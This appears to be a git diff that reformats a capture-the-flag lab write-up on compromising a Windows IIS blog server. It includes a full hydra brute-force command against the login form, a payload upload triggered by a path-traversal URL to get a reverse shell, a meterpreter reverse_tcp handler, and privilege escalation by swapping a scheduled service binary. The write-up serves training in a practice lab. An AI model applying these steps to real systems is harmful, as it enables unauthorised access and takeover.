@@ -13,22 +13,24 @@ Navigated to the IP address: 10.10.44.152
 
 ## Recon
 
-Started Nmap scan "nmap -v -Pn -oN nmap1 10.10.44.152" to find open ports.
-Ran follow up scan using service detection scripts "nmap -sV -v -Pn -p 80,3389 -oN nmap2 10.10.44.152"
+Started Nmap scan `nmap -v -Pn -oN nmap1 10.10.44.152` to find open ports.
+Ran follow up scan using service detection scripts `nmap -sV -v -Pn -p 80,3389 -oN nmap2 10.10.44.152`
 
+```
 Found two open ports:
 PORT     STATE SERVICE            VERSION
 80/tcp   open  http               Microsoft IIS httpd 8.5
 3389/tcp open  ssl/ms-wbt-server?
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
 
 ![](Assets/Images/Pasted%20image%2020221201113122.png)
 
-Ran Gobuster to locate additional directories stored on the web server using the following command: gobuster -u http://10.10.44.152/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -o Gobuster_results
+Ran Gobuster to locate additional directories stored on the web server using the following command: `gobuster -u http://10.10.44.152/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -o Gobuster_results`
 
 ![](Assets/Images/Pasted%20image%2020221201113430.png)
 
-/admin looks interesting.
+`/admin` looks interesting.
 
 Navigating to this page we can see a login form.
 
@@ -45,6 +47,7 @@ Attempted admin:admin however this failed.
 ## Question 1: What request type is the Windows website login form using?
 
 Intercepted login with Burpsuite
+
 ![](Assets/Images/Pasted%20image%2020221201114321.png)
 ![[Assets/Images/Pasted image 20221201115259.png]]
 
@@ -52,18 +55,20 @@ Intercepted login with Burpsuite
 
 "Now we know the request type and have a URL for the login form, we can get started brute-forcing an account. Run the following command but fill in the blanks:""
 
-hydra -l (username) -P /usr/share/wordlists/(wordlist) (ip) http-post-form
+`hydra -l (username) -P /usr/share/wordlists/(wordlist) (ip) http-post-form`
 
 ## Question 2: Guess a username, choose a password wordlist and gain credentials to a user account!
 
-Pulled URL and cookie from Burp "/Account/login.aspx:"
+Pulled URL and cookie from Burp `/Account/login.aspx:`
 
-Added ' :Login Failed ' to ensure Hydra moves on from each failed attempt.
-Added -vv to turn on verboise mode.
+Added `:Login Failed` to ensure Hydra moves on from each failed attempt.
+Added `-vv` to turn on verboise mode.
 
-In the cookie, I've set the "Name" field to ^USER^ and "Password" field to ^PASS^ 
+In the cookie, I've set the `Name` field to `^USER^` and `Password` field to `^PASS^` 
 
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.44.152 http-post-form "/Account/login.aspx:__VIEWSTATE=54As4GFCqjGQGRbh9x7p0JNYvP%2B%2FWYn8j0cgScQS%2FAETVoSDvDYb2jlruIqzrWu%2BFKXaRDQHiCzou6Bwih4wO%2Flpe%2B7gsWB%2FMi5Y8eoy4DpuwR2bHgGVFlsHNNvGI8Dplh3kdQhPd%2FvhfA3jGzbrRpq71XPpAN52VHLRfmGNGrXgcS0f&__EVENTVALIDATION=pTDpOJM1eosWaKomMwNkAu0p7SKMFK6s9h9gOoJgd5JW94cM%2FvcianYE9uu7SmmJHRfy2akgVkIJNAB0Zdu%2BHwcRsIZWkOdIlyKPF7kZacVMKvMwlNVtHDKB3ZaejVQHJM12Aa3W1RLRe7mtING9aEYCmdSJu8uYEV1PUbBGByebLRt1&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.44.152 http-post-form "/Account/login.aspx:__VIEWSTATE=54As4GFCqjGQGRbh9x7p0JNYvP%2B%2FWYn8j0cgScQS%2FAETVoSDvDYb2jlruIqzrWu%2BFKXaRDQHiCzou6Bwih4wO%2Flpe%2B7gsWB%2FMi5Y8eoy4DpuwR2bHgGVFlsHNNvGI8Dplh3kdQhPd%2FvhfA3jGzbrRpq71XPpAN52VHLRfmGNGrXgcS0f&__EVENTVALIDATION=pTDpOJM1eosWaKomMwNkAu0p7SKMFK6s9h9gOoJgd5JW94cM%2FvcianYE9uu7SmmJHRfy2akgVkIJNAB0Zdu%2BHwcRsIZWkOdIlyKPF7kZacVMKvMwlNVtHDKB3ZaejVQHJM12Aa3W1RLRe7mtING9aEYCmdSJu8uYEV1PUbBGByebLRt1&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv`
+```
 
 ![](Assets/Images/Pasted%20image%2020221201122947.png)
 
@@ -100,12 +105,12 @@ Started netcat listener on port 4445
 
 ![](Assets/Images/Pasted%20image%2020221201125709.png)
 
-Navigated to: http://10.10.44.152/admin/app/editor/editpost.cshtml
+Navigated to: `http://10.10.44.152/admin/app/editor/editpost.cshtml`
 Uploaded the payload using the file manager button on the tool bar.
 
 ![](Assets/Images/Pasted%20image%2020221201130317.png)
 
-Navigate to: http://10.10.44.152/?theme=../../App_Data/files which activated the connection to the netcat listener
+Once you navigate to `http://10.10.44.152/?theme=../../App_Data/files` the payload will activate and we can catch our shell!
 
 ![](Assets/Images/Pasted%20image%2020221201130611.png)
 
@@ -129,9 +134,9 @@ Startup msfconsole & setup a multi handler
 
 ![](Assets/Images/Pasted%20image%2020221201134910.png)
 
-PAYLOAD => windows/meterpreter/reverse_tcp
+PAYLOAD => `windows/meterpreter/reverse_tcp`
 
-Ran 'Exploit -j' to run the job in the background. Moved over to the netcat shell and executed the payload.
+Ran `Exploit -j` to run the job in the background. Moved over to the netcat shell and executed the payload.
 
 ![](Assets/Images/Pasted%20image%2020221201135351.png)
 
@@ -165,7 +170,7 @@ Checking the events directory for the WindowsScheduler service for what what eve
 
 ![](Assets/Images/Pasted%20image%2020221201150823.png)
 
-Checking the INI_LOG.txt file there looks to be an (administrator) process which is repeatedly starting and stopping. This will be the binary to exploit here.
+Checking the `INI_LOG.txt` file there looks to be an (administrator) process which is repeatedly starting and stopping. This will be the binary to exploit here.
 
 ![](Assets/Images/Pasted%20image%2020221201150900.png)
 
@@ -176,7 +181,7 @@ Using this abnormal service, escalate your privileges!
 
 ## Question 7: What is the user flag (on Jeffs Desktop)?
 
-Moving back to the WindowsScheduler directory (where the Message.exe file is located), copied accross the same shell used earlier and re-named it "Message.exe" while also changing the original Message.exe file to "Message.bak".
+Moving back to the WindowsScheduler directory (where the `Message.exe` file is located), copied accross the same shell used earlier and re-named it `Message.exe` while also changing the original Message.exe file to `Message.bak`.
 
 ![](Assets/Images/Pasted%20image%2020221201152939.png)
 
